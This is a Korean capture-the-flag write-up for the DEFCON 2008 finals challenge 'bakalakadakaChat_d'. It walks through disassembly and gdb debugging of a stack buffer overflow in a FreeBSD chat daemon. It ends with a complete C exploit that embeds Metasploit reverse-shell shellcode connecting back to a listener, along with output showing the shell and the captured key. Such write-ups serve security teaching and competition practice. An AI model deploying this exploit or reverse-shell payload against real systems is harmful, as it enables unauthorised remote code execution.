@@ -1,0 +1,510 @@
+----------------------------------------------------------------
+DEFCON 2008 Capture The Flag 본선 문제 풀이 - bakalakadakaChat_d
+
+
+
+by hkpco(박찬암)
+============================
+mail     - hkpco@korea.com
+homepage - http://hkpco.kr/
+group    - wowhacker&wowcode
+date     - 2008. 08. 17
+============================
+----------------------------------------------------------------
+
+
+
+[Ready]. 잡담
+
+DEFCON 2008 Capture The Flag가 끝났다. 다른 팀들보다 먼저 푼 문제들도 많았으며 더 좋은 성적을 낼 수도 있었지만 Steals,
+Overwrites 점수의 간과, 대회측의 실수, 문제 서버의 부재 등으로 인하여 힘들었다. 대회당시 가장 먼저 Breakthroughs 점수를
+획득한 문제를 본 문서의 풀이 대상으로 두었다. 내가 데프콘 본선 문제의 풀이를 써서 공개하는 이유는, 여러가지 사정 때문에
+본선에 직접 참가하지 못한 사람들에게 간접적으로나마 경험을 주고 싶은것과, 세계적인 대회라고 해서 결코 어렵지만은 않다는
+것을 보여주고 싶어서이다. 때문에 문제 수준을 고려하여 풀이 대상을 선택했지만 아무튼, 후자의 경우를 다시 말하자면 일종의
+Capture The Flag에 대한 고정관념을 없애고 자신감을 얻을 수 있도록 도와주고 싶은 마음에 문서 작성을 결심하였다.
+
+
+
+
+[Go]. bakalakadakaChat_d 문제 풀이
+
+본격적인 분석 이전에 file 명령을 이용하여 바이너리의 몇 가지 기본적인 정보를 살펴 보겠다.
+
+----------
+[hkpco@localhost hk]$ file bakalakadakaChat_d 
+bakalakadakaChat_d: ELF 32-bit LSB executable, Intel 80386, version 1 (FreeBSD), dynamically linked (uses shared libs),
+for FreeBSD 6.3, stripped
+----------
+
+
+FreeBSD 6.3 바이너리이며, 동적 라이브러리이고 디버깅 관련 정보는 삭제된 것을 알 수 있다.
+이제 disassemble 코드를 통한 분석에 들어가보자. 본 문서에서는 disassemble 코드를 objdump 결과에 대한 것으로 통일하겠다.
+참고로 나는 분석시 주로 [gdb & objdump & ida]의 조합을 즐겨한다.
+
+초기 설정을 수행하는 것으로 보이는 0x8049ccc 주소의 함수부터 살펴보자.
+다음은 소켓을 생성하는 사용자 함수의 호출 코드이며 포트 번호를 인자로 주고있다.
+
+----------
+ 8049cef:	83 ec 0c             	sub    $0xc,%esp
+ 8049cf2:	68 19 3d 00 00       	push   $0x3d19
+ 8049cf7:	e8 7c f3 ff ff       	call   8049078 <free@plt+0x364>
+ 8049cfc:	83 c4 10             	add    $0x10,%esp
+----------
+
+
+포트 번호는 16진수로 0x3d19이며 이를 10진수로 나타내면 15641가 된다.
+위 코드에서 호출되는 함수는 소켓 프로그래밍 시 거치는 다소 정규화된 루틴이므로 상세한 분석은 생략하겠다.
+계속해서 분석하기 전에 방금 구한 포트번호로 접속하여 서버의 간단한 프로토콜을 익혀보았다.
+
+----------
+[hkpco@localhost ~]$ telnet 192.168.40.131 15641
+Trying 192.168.40.131...
+Connected to 192.168.40.131.
+Escape character is '^]'.
+Enter Username:  hkpco
+******************************************
+Durka, Durka, Welcome to Jihad cafe
+type help for list of available commands
+******************************************
+
+Chatters in room:
+    hkpco
+// 사용자 이름 입력
+
+:>  hi
+hkpco says: hi
+// "hi" 메시지 입력
+
+:>  help
+available commands:
+	quit
+	who
+	help
+// "help" 명령 입력
+
+:>  who
+users in room:
+hkpco
+// "who" 명령 입력
+
+:>  quit
+hkpco says: Screw you guys I'm going home!
+:>  Connection closed by foreign host.
+// "quit" 명령 입력, 접속 종료.
+----------
+
+
+직접 테스트 해 보면 netcat이나 소켓 프로그래밍 등을 이용한 방법으로는 데이터를 주고 받을 수 없으며 이는 telnet을 이용하면
+가능한 것을 알 수 있을 것이다. 여기에 대한 이유는 나중에 살펴보도록 하고 분석을 계속해 보자.
+
+다음은 daemon() 함수를 호출하는 코드이며 이를 통해 문제 서버는 데몬 환경에서 구동된다는 것을 알 수 있다.
+
+----------
+ 8049d20:	83 ec 08             	sub    $0x8,%esp
+ 8049d23:	6a 00                	push   $0x0
+ 8049d25:	6a 00                	push   $0x0
+ 8049d27:	e8 88 ef ff ff       	call   8048cb4 <daemon@plt>
+ 8049d2c:	83 c4 10             	add    $0x10,%esp
+// daemon( 0, 0 );
+----------
+
+
+조금 아래의 코드를 보면 pthread mutex의 초기화 과정이 수행되는것을 볼 수 있다.
+
+----------
+ 8049d7a:	83 ec 08             	sub    $0x8,%esp
+ 8049d7d:	6a 00                	push   $0x0
+ 8049d7f:	ff 35 fc b0 04 08    	pushl  0x804b0fc
+ 8049d85:	e8 3a ee ff ff       	call   8048bc4 <pthread_mutex_init@plt>
+ 8049d8a:	83 c4 10             	add    $0x10,%esp
+// pthread_mutex_t *mutex;
+// pthread_mutex_init( &mutex, NULL );
+----------
+
+
+계속해서 다음 코드는 본격적인 프로그램의 루틴을 수행하기 위해 호출되는 부분이다.
+
+----------
+ 8049d8d:	83 ec 08             	sub    $0x8,%esp
+ 8049d90:	68 14 99 04 08       	push   $0x8049914
+ 8049d95:	ff 75 fc             	pushl  -0x4(%ebp)
+ 8049d98:	e8 3b f4 ff ff       	call   80491d8 <free@plt+0x4c4>
+ 8049d9d:	83 c4 10             	add    $0x10,%esp
+----------
+
+
+80491d8 주소의 함수가 호출되며 주요 루틴은 다음과 같다.
+
+----------
+.
+.
+ 80491ec:	83 ec 04             	sub    $0x4,%esp
+ 80491ef:	8d 45 ec             	lea    -0x14(%ebp),%eax
+ 80491f2:	50                   	push   %eax
+ 80491f3:	8d 45 d8             	lea    -0x28(%ebp),%eax
+ 80491f6:	50                   	push   %eax
+ 80491f7:	ff 75 08             	pushl  0x8(%ebp)
+ 80491fa:	e8 35 fa ff ff       	call   8048c34 <accept@plt>
+ 80491ff:	83 c4 10             	add    $0x10,%esp
+ 8049202:	89 45 f4             	mov    %eax,-0xc(%ebp)
+// cli_sock = accept( ... );
+
+ 8049205:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%ebp)
+ 8049209:	75 02                	jne    804920d <free@plt+0x4f9>
+.
+.
+/* cli_sock의 값이 -1이 아니면(즉, accpet 함수가 성공하면) */
+ 804920d:	ff 75 f4             	pushl  -0xc(%ebp)
+ 8049210:	ff 75 0c             	pushl  0xc(%ebp)
+ 8049213:	6a 00                	push   $0x0
+ 8049215:	8d 45 f0             	lea    -0x10(%ebp),%eax
+ 8049218:	50                   	push   %eax
+ 8049219:	e8 76 f8 ff ff       	call   8048a94 <pthread_create@plt>
+ 804921e:	83 c4 10             	add    $0x10,%esp
+// pthread_create( %eax, 0x0, 0xc(%ebp), -0xc(%ebp) );
+
+ 8049221:	eb c9                	jmp    80491ec <free@plt+0x4d8>
+// accept() 함수로 점프
+----------
+
+
+클라이언트의 접속을 받은 뒤 pthread_create() 함수를 통하여 해당 클라이언트를 위한 새로운 스레드를 생성한다.
+이 때 0xc(%ebp)에 해당하는 함수를 실행하는데, 이는 0x80491d8 함수가 호출될 당시 두 번째 인자인 0x8049914를 의미한다.
+이것으로 클라이언트가 접속한 뒤에 수행되는 루틴은 0x8049914 라는것을 알 수 있다.
+해당 루틴에서 유심히 살펴봐야 할 부분은 다음과 같다.
+
+----------
+ 8049914:	55                   	push   %ebp
+ 8049915:	89 e5                	mov    %esp,%ebp
+ 8049917:	81 ec 28 05 00 00    	sub    $0x528,%esp
+ 804991d:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
+.
+.
+ 8049975:	83 ec 08             	sub    $0x8,%esp
+ 8049978:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 804997e:	50                   	push   %eax
+ 804997f:	ff 75 08             	pushl  0x8(%ebp)
+ 8049982:	e8 7d fe ff ff       	call   8049804 <free@plt+0xaf0>
+ 8049987:	83 c4 10             	add    $0x10,%esp
+// 8049804( cli_sock, -0x208(%ebp) );
+.
+.
+.
+ 80499fc:	6a 0d                	push   $0xd
+ 80499fe:	68 fe 01 00 00       	push   $0x1fe
+ 8049a03:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
+ 8049a09:	50                   	push   %eax
+ 8049a0a:	ff 75 08             	pushl  0x8(%ebp)
+ 8049a0d:	e8 ce f4 ff ff       	call   8048ee0 <free@plt+0x1cc>
+ 8049a12:	83 c4 10             	add    $0x10,%esp
+// 8048ee0( cli_sock, -0x108(%ebp), 0x1fe, 0xd );
+----------
+
+
+위 코드에서 호출되는 첫 번째 함수인 0x8049804는 Username을 입력받는 역할을 하며 특별한 취약성은 존재하지 않는다.
+두 번째 함수인 0x8048ee0는 소켓으로부터 데이터를 수신하는 역할을 하며 여기서는 명령이나 메시지를 입력받을 때 사용되고 있다.
+해당 함수의 루틴은 다소 정규화 된 코드이므로 상세한 분석은 생략하겠다.
+
+0x8048ee0 함수에 대한 각 인자의 역할을 나타내어 보면 다음과 같다.
+
+==========
+0x8048ee0 function
+
+argument 1 = 데이터를 수신할 소켓
+argument 2 = 데이터를 저장할 버퍼
+argument 3 = 데이터의 최대 허용 길이
+argument 4 = 해당 값이 나올때 까지 입력
+==========
+
+
+서버에서 테스트 했을 당시 netcat 혹은 소켓 프로그래밍을 이용한 데이터 송수신이 되지 않은 이유는 바로 여기에 있다.
+네 번째 인자에 해당하는 0xd 문자가 나올 때 까지 입력을 받기 때문에 데이터 끝에 항상 "\x0d\x0a"가 추가되는 telnet과는 달리
+netcat이나 소켓 프로그래밍으로는 데이터를 전송해도 별다른 반응이 없었던 것이다.
+
+함수의 역할을 다시 적용하여 재 해석해 보면, -0x108(%ebp) 버퍼에 최대 0x1fe 크기만큼 0xd 문자가 나올 때 까지 입력을 받는다.
+이는 버퍼의 크기가 0x108(16진수)인 것에 반하여 입력을 받는 크기는 0x1fe 이기 때문에 십진수로 나타내면 총 246byte 만큼의
+오버플로우가 일어나게 된다.
+
+그러면 이제 버퍼에 우리가 수행하기를 원하는 기계어 코드를 저장하고 eip를 해당 시작 주소로 덮어 씌우면 공격이 성공할 것이다.
+그런데 여기서 한 가지 문제점이 있는데, 문제 바이너리는 클라이언트의 접속 당시 자식 프로세스가 아닌 새로운 스레드를 생성하여
+루틴을 수행하는 데몬 프로그램이기 때문에 공격이 한번에 성공하지 못하면 데몬이 죽어버린다. 따라서 Brute force가 아닌 정확한
+주소 값 지정이 필요하게 된다. 우선 공격을 위한 페이로드를 간단히 구성해 보았다.
+
+----------
+Username - 리버스 텔넷 쉘 코드
+:>(command) - 쓰레기 값 + Username 버퍼의 시작주소
+----------
+
+
+이제 디버깅을 통하여 Username을 저장하는 버퍼의 주소를 알아낸 다음 eip에 덮어씌우면 공격이 성공할 것이다.
+우선 바이너리를 실행시킨 뒤 gdb를 이용하여 프로세스를 attach 하였다.
+
+----------
+# ./bakalakadakaChat_d
+# ps -aux | grep baka
+durka  1167  0.0  0.9  1512  1104  ??  Ss   12:38PM   0:00.00 ./bakalakadakaChat_d
+
+# gdb -q ./bakalakadakaChat_d 1167
+(no debugging symbols found)...Attaching to program: /root/hk/bakalakadakaChat_d, process 1167
+Reading symbols from /lib/libpthread.so.2...(no debugging symbols found)...done.
+
+warning: Unable to get location for thread creation breakpoint: generic error
+[New LWP 100064]
+Loaded symbols for /lib/libpthread.so.2
+Reading symbols from /lib/libc.so.6...(no debugging symbols found)...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /libexec/ld-elf.so.1...(no debugging symbols found)...done.
+Loaded symbols for /libexec/ld-elf.so.1
+[Switching to LWP 100064]
+0x2810a70d in accept () from /lib/libc.so.6
+
+(gdb) info thread
+* 1 LWP 100064  0x2810a70d in accept () from /lib/libc.so.6
+----------
+
+
+프로그램 시작 직후 어떠한 접속도 하지 않았기 때문에 접속을 대기하는 스레드는 하나만 존재하여 따로 추적할 스레드를
+지정해 주지 않아도 된다. 이제 버퍼 주소를 확인하기 위한 브레이크 포인트의 위치를 지정하기 위해 다음 코드를 살펴보자.
+
+----------
+ 8049975:	83 ec 08             	sub    $0x8,%esp
+ 8049978:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 804997e:	50                   	push   %eax
+ 804997f:	ff 75 08             	pushl  0x8(%ebp)
+-> 8049982:	e8 7d fe ff ff       	call   8049804 <free@plt+0xaf0>
+-> 8049987:	83 c4 10             	add    $0x10,%esp
+----------
+8049804 함수 내부 루틴
+
+ 804987e:	6a 0d                	push   $0xd
+ 8049880:	68 ff 00 00 00       	push   $0xff
+ 8049885:	ff 75 0c             	pushl  0xc(%ebp)
+ 8049888:	ff 75 08             	pushl  0x8(%ebp)
+ 804988b:	e8 50 f6 ff ff       	call   8048ee0 <free@plt+0x1cc>
+ 8049890:	83 c4 10             	add    $0x10,%esp
+// 2 번째 인자(-0x208(%ebp))에 255byte 만큼 입력받는 함수
+----------
+
+
+Username을 입력받는 루틴이며 0x8049804 함수 호출 시 두 번째 인자에 데이터가 저장된다. 그러므로 0x8049982, 0x8049987에 각각
+브레이크 포인트를 설정하여 0x8049982에서 버퍼의 주소를 확인하고, 입력이 수행된 뒤 0x8049987에서 데이터가 정상적으로 입력이
+되었는지를 확인하여 최종적으로 버퍼의 주소를 확정 지을것이다.
+
+----------
+terminal_1
+----------
+(gdb) b *0x08049982
+Breakpoint 1 at 0x8049982
+(gdb) b *0x08049987 
+Breakpoint 2 at 0x8049987
+(gdb) c       
+Continuing.
+[New Thread 0x8055600 (LWP 100076)]
+[Switching to Thread 0x8055600 (LWP 100076)]
+
+Breakpoint 1, 0x08049982 in ?? ()
+(gdb) x/x $eax
+0xbf8fddb0:	0x00000000
+// -0x208(%ebp)의 시작 주소
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08049987 in ?? ()
+(gdb) x/s 0xbf8fddb0
+0xbf8fddb0:	 "hkpco"
+// 입력한 데이터가 버퍼에 정상적으로 저장 됨
+----------
+
+----------
+terminal_2
+----------
+[hkpco@localhost ~]$ telnet 192.168.40.131 15641
+Trying 192.168.40.131...
+Connected to 192.168.40.131.
+Escape character is '^]'.
+Enter Username:  hkpco
+----------
+
+
+디버깅을 통하여 Username의 입력 값을 저장하는 버퍼의 시작 주소는 0xbf8fddb0 라는것을 알 수 있으며 해당 공간에 기계어 코드를
+삽입한 뒤 두 번째 입력에서 eip에 0xbf8fddb0 주소를 덮어 씌우면 원하는 코드를 실행할 수 있을 것이다.
+최종적인 페이로드를 구성해 보면 다음과 같다.
+
+-------
+Username - 실행을 원하는 쉘 코드(255byte 이하, 0x0d 제거)
+:>(command) - dummy(264 + 4) + 0xbf8fddb0
+-------
+
+
+command에서의 입력은 버퍼가 -0x108(%ebp)이기 때문에 264(16진수 0x108) + 4(ebp)를 쓰레기 코드로 입력하고 return address를
+Username의 시작 주소로 덮어 씌우는 것이다. 주의할 점은 데몬 프로그램이 0x0d를 입력의 끝으로 보기 때문에 기계어 코드에서
+0x0d 문자를 제거해야 한다. 다음은 이렇게 제작한 익스플로잇을 이용하여 공격하는 모습이다.
+
+==========
+Terminal 1
+==========
+[hkpco@localhost hk]$ gcc -o baka_exp baka_exp.c
+[hkpco@localhost hk]$ ./baka_exp 192.168.40.131 15641
+
+<the eXploit of hkpco>
+
+1: Enter Username:  
+2: ******************************************
+
+3: Durka, Durka, Welcome to Jihad cafe
+type help for list of available commands
+******************************************
+
+Chatters in room:
+    1?旭珷?$?
+                                                              
+:>  
+dummy size: 268
+ret size: 4
+total size: 274
+==========
+
+
+==========
+Terminal 2
+==========
+# nc -l 7171
+id
+uid=1021(durka) gid=1021(durka) groups=1021(durka)
+
+cat /home/durka/key
+503ac0893e919996ad9204cb2054a8d2031b
+==========
+
+
+성공적으로 공격이 수행된 것을 볼 수 있다.
+
+
+
+
+[Bonus]. 익스플로잇 첨부
+
+- baka_exp.c -
+
+/*
+	bakalakadakaChat_d eXploit
+
+	by hkpco
+	hkpco@korea.com
+	http://hkpco.kr/
+*/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#define RET 0xbf8fddb0
+
+int sock_conn( char **argv );
+int inline err( char *msg );
+
+int main( int argc , char **argv )
+{
+	int sockfd;
+	char buffer[1024] = {0x00,};
+	char dummy[1024] = {0x00,};
+	char ret[5] = {0x00,};
+	char go[4096] = {0x00,};
+
+	/* bsd_ia32_reverse -  LHOST=192.168.40.131 LPORT=7171 Size=92 Encoder=PexFnstenvSub http://metasploit.com */
+	char scode[] =
+	"\x31\xc9\x83\xe9\xef\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x82"
+	"\xc8\x61\x9d\x83\xeb\xfc\xe2\xf4\xe8\xa9\x39\x04\xd0\x8a\x33\xdf"
+	"\xd0\xa0\xa1\x35\xaa\x4b\xac\x1d\xea\xd8\x63\x81\x81\x41\x80\xf7"
+	"\x92\x99\x31\xcc\x15\xa2\x03\xc5\x4f\x48\x0b\x9f\xdb\x78\x3b\xcc"
+	"\xd5\x99\xac\x1d\xcb\xb1\x97\xcd\xea\xe7\x4e\xee\xea\xa0\x4e\xff"
+	"\xeb\xa6\xe8\x7e\xd2\x9c\x32\xce\x32\xf3\xac\x1d";
+
+	if( argc < 3 ) {
+		fprintf( stderr, "%s [server] [port]\n", argv[0] );
+		return -1;
+	}
+
+	sockfd = sock_conn( argv );
+
+	printf( "\n<the eXploit of hkpco>\n\n" );
+	read( sockfd, buffer, sizeof(buffer) );
+	printf( "1: %s\n", buffer );
+
+	memset( buffer, 0x0, sizeof(buffer) );
+	snprintf( buffer, sizeof(buffer) -1, "%s\x0d\x0a", scode );
+	write( sockfd, buffer, strlen(buffer) );
+	// REVERSE SHELLCODE SEND
+
+	memset( buffer, 0x0, sizeof(buffer) );
+	read( sockfd, buffer, sizeof(buffer) );
+	printf( "2: %s\n", buffer );
+
+	memset( buffer, 0x0, sizeof(buffer) );
+	read( sockfd, buffer, sizeof(buffer) );
+	printf( "3: %s\n", buffer );
+	memset( buffer, 0x0, sizeof(buffer) );
+
+	/* attack code */
+	memset( dummy, 0x0, sizeof(dummy) );
+	memset( dummy, 0x41, 264 +4 );
+	memcpy( dummy, scode, strlen(scode) );
+	memcpy( dummy, "\x90\x90\x90\x90", 4 );
+
+	memset( ret, 0x0, sizeof(ret) );
+	ret[0] = (RET >> 0) & 0xff;
+	ret[1] = (RET >> 8) & 0xff;
+	ret[2] = (RET >> 16) & 0xff;
+	ret[3] = (RET >> 24) & 0xff;
+
+	printf( "dummy size: %d\n", strlen(dummy) );
+	printf( "ret size: %d\n", strlen(ret) );
+
+	memset( go, 0x0, sizeof(go) );
+	snprintf( go, sizeof(go) -1, "%s%s\x0d\x0a", dummy, ret );
+
+	printf( "total size: %d\n", strlen(go) );
+	write( sockfd, go, strlen(go) );
+	// ATTACK CODE SEND
+
+	close(sockfd);
+	return 0;
+}
+
+int sock_conn( char **argv )
+{
+	int sockfd;
+	struct sockaddr_in sock;
+	struct hostent *host_st;
+
+	sockfd = socket( PF_INET, SOCK_STREAM, 0 );
+	if( sockfd < 0 )
+		err( "socket()" );
+
+	host_st = gethostbyname( argv[1] );
+	if( host_st == NULL )
+		err( "gethostbyname()" );
+
+	bzero( sock.sin_zero, sizeof(sock.sin_zero) );
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(atoi(argv[2]));
+	sock.sin_addr = *((struct in_addr *)host_st->h_addr);
+
+	if( connect( sockfd, (struct sockaddr *)&sock, sizeof(sock) ) < 0 )
+		err( "connect()" );
+
+	return sockfd;
+}
+
+int inline err( char *msg )
+{
+	perror(msg);
+	exit(-1);
+}
